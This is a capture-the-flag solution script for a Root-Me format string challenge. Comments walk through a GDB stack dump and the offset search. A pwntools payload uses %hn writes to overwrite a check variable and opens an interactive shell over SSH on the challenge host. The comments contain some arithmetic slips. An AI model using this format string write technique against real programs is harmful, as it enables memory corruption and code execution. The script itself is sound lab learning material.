# gdb-peda ./ch14
# r AAAA
# ...
# Breakpoint 1, 0x080486f0 in main ()
# gdb-peda$ x/32wx $esp
# 0xbffffa70:     0x08048855      0x04030201      0xbffffd3d      0x080485f1
# 0xbffffa80:     0x00000000      0x00000000      0x000000c2      0xbffffbe4
# 0xbffffa90:     0xb7fe1409      0xf63d4e2e      0x04030201      0x41414141
# 0xbffffaa0:     0x00000000      0x00000000      0x00000000      0x00000000

# as we can see, our input goes right after the "check" (0x04030201) - we can't overwrite it with smashing
# but we can abuse %n format  in printf vuln. to write into arbitrary memory.

# $ ./ch14 "$(python -c 'print "A"*4 + "%x "*9')"
# check at 0xbffffb88
# argv[1] = [AAAA%x %x %x %x %x %x %x %x %x ]
# fmt=[AAAA80485f1 0 0 c2 bffffc24 b7fe1409 f63d4e2e 4030201 41414141 ]  <--- last 4 bytes are our AAAA, so offset is 9
# check=0x4030201

# 0xbeef = 48879
# 0xdead = 57005
# check at 0xbffffb88

# \xd8\xfa\xff\xbf\xda\xfa\xff\xbf%48871x%9hn%8126x%10$hn

from pwn import *
import struct

s = ssh(host='challenge02.root-me.org', user='app-systeme-ch14', password='app-systeme-ch14', port=2222)

check_addr  = struct.pack("I", 0xbffffb88)
check2_addr = struct.pack("I", 0xbffffb88 + 2)

# 0xbeef - 4 = 48875
# 0xdead - 0xbeef - 4 = 57005 - 48875 -4 = 8126
payload  = ""
payload  = check_addr
payload += check2_addr
payload += "%48871x%9$hn"  # 0xbeef - 4 - 4
payload += "%8126x%10$hn"

p = s.process(['/challenge/app-systeme/ch14/ch14', payload])

p.interactive()
